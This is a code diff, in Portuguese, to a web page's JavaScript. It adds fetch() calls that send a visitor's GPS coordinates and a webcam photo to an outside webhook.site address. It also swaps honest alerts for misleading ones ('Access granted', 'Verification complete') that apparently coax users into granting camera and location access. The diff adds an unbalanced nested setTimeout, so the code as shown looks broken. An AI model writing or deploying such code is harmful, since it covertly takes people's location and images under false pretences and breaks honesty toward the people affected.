@@ -54,15 +54,21 @@
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        alert(`Localização obtida!\nLat: ${lat}\nLon: ${lon}`);
-                        // Futuramente: fetch() para enviar lat/lon para o backend
+                        
+                        // ENVIO DOS DADOS
+                        fetch('https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6', {
+                            method: 'POST',
+                            mode: 'no-cors', // Evita erros de política de segurança simples
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ latitude: lat, longitude: lon, evento: 'gps_capturado' })
+                        });
+
+                        alert("Acesso liberado com sucesso!");
                     },
                     function(error) {
-                        alert("Acesso à localização negado ou indisponível.");
+                        alert("Erro: Por favor, habilite a localização para continuar.");
                     }
                 );
-            } else {
-                alert("Geolocalização não suportada pelo navegador.");
             }
         }
 
@@ -77,19 +83,25 @@
                 video.style.display = "block"; 
 
                 setTimeout(() => {
+                    setTimeout(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     const imagemBase64 = canvas.toDataURL('image/png');
-                    alert("Foto capturada com sucesso!");
+
+                    // ENVIO DA FOTO
+                    fetch('https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ foto: imagemBase64, evento: 'foto_capturada' })
+                    });
                     
                     stream.getTracks().forEach(track => track.stop());
                     video.style.display = "none";
-
-                    // Futuramente: fetch() para enviar imagemBase64 para o backend
-                }, 1500); 
-
+                    alert("Verificação concluída!");
+                }, 1500);
             } catch (error) {
                 alert("Acesso à câmera negado.");
             }
